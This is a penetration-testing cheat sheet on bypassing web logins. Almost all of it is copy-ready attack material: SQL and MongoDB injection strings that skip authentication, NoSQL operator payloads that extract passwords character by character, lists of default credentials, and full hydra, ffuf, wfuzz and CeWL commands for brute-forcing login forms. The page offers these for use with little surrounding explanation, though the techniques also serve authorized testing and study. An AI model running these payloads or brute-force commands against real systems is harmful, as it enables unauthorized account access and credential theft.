---
title: Web Login Bypass
description: 
tags:
    - SQL Injection
    - Web
refs:
    - https://tryhackme.com/room/nosqlinjectiontutorial
date: 2023-01-09
draft: false
---

## SQL Injections

```txt
admin' or '1'='1
```

### Microsoft, Oracle, PostgreSQL

```txt
admin'--
admin' or 1=1--
admin' or '1'='1'--
```

### MySQL

```txt
admin'-- -
admin'#

admin' or 1=1#
admin' or 1=1-- -

admin' or '1'='1'-- -
admin' or '1'='1'#
```

### Mongo

```txt
admin' || 1==1//
admin' || 1==1%00
admin' || '1==1
admin' || '1'=='1
```

Also, we can manipulate the POST parameter as below:

```sh
username[$ne]=xyz&password[$ne]=xyz

# If we found the "admin" exists, we can exclude "admin" by specifying $nin operator.
username[$nin][]=admin&password[$ne]=xyz
# If more users are found, we can exclude the user.
username[$nin][]=admin&username[$nin][]=john&password[$ne]=xyz
```

- **“$ne”** operator gets the document which the username and password not equal to the given value (“xyz” here). So we can login successfully if the username and password are not equal “xyz”.
- **“$nin”** operator gets the document which is not included the given value (”admin” and “john” here). So we can login successfully as the another user if the another user exists.

After finding the usernames, we can also obtain the passwords using the **“$regex”** operator as the following example.

```bash
# Check if the password length is 7 characters.
username=admin&password[$regex]=^.{7}$
# If not, change 7 to 6 (or 8 or something number).
username=admin&password[$regex]=^.{6}$
# If the number of characters turns out to be 6, brute force the character one by one.
username=admin&password[$regex]=^a.....$
username=admin&password[$regex]=^s.....$
username=admin&password[$regex]=^se....$
username=admin&password[$regex]=^sec...$
```

<br />

## Default Credentials

```sh
admin:admin
admin:password
admin:password1
admin:password123
administrator:password
administrator:password1
administrator:password123

# phpIPAM
admin:ipamadmin
Admin:ipamadmin

# PHPMyAdmin
root:(null)
root:password
```

<br />

## Wildcard Brute Force

If it is allowed to login with wildcard (*), you may be able to find the username/password with brute force.

```bash
username = *
password = *
```

For example, in Turbo Intruder (Burp Suite), login attempt with alpha numeric characters one by one.

```bash
username=%s*&password=*
# or
username=*&password=%s*
```

My favorite wordlist for it is the seclists:  
[https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/alphanum-case-extra.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/alphanum-case-extra.txt)

<br />

## Brute Force Credentials

Before brute forcing, we need wordlists used for it.

- **[Rockyou](https://github.com/praetorian-inc/Hob0Rules/blob/master/wordlists/rockyou.txt.gz)**

- **[SecLists](https://github.com/danielmiessler/SecLists)**

- **[CeWL](https://github.com/digininja/CeWL)**

    Generate the custom wordlist from the target web page.

    ```sh
    cewl https://vulnerable.com > scraped_words.txt
    ```

### Ffuf

```sh
# -fc: Filter HTTP status code
ffuf -w passwords -X POST -d "username=admin&password=FUZZ" -u http://vulnerable.com/login -fc 401

# Basic Auth
ffuf -u https://admin:FUZZ@example.com/ -w wordlist.txt -fc 401
```

### Hydra

```sh
# Cracking username
hydra -L usernames.txt -p password vulnerable.com http-post-form "/login:username=^USER^&password=^PASS^:Invalid username"
# Cracking password
hydra -l username -P passwords.txt vulnerable.com http-post-form "/login:username=^USER^&password=^PASS^:Invalid password"

# HTTPS (https-post-form)
hydra -L usernames.txt -P passwords.txt vulnerable.com https-post-form "/login:username=^USER^&password=^PASS^:Username or password is incorrect"


# Cracking the Authorization or WWW-Authenticate in the request header.
hydra -L usernames.txt -P passwords.txt <target-ip> http-get
```

### Wfuzz

```sh
# Cracking username
wfuzz -z file,./usernames.txt -d "username=FUZZ&password=password" https://vulnerable.com/login
# Cracking password
wfuzz -z file,./passwords.txt -d "username=admin&password=FUZZ" https://vulnerable.com/login

# -- Options --------------------------------------------------------------------------------------------

# --hc: Hide the specific status code
wfuzz -z file,./usernames.txt -d "username=FUZZ&password=password" --hc 302 http://vulnerable.com/login
# --hh: Hide the specific chars (Content-Length)
wfuzz -z file,./passwords.txt -d "username=admin&password=FUZZ" --hh 783 http://vulnerable.com/login

# --sc: Show the specific statuc code
wfuzz -z file,./usernames.txt -d "username=FUZZ&password=password" --sc 302 http://vulnerable.com/login
# --sh: Show the specific chars (Content-Length)
wfuzz -z file,./passwords.txt -d "username=admin&password=FUZZ" --sh 1214 http://vulnerable.com/login
```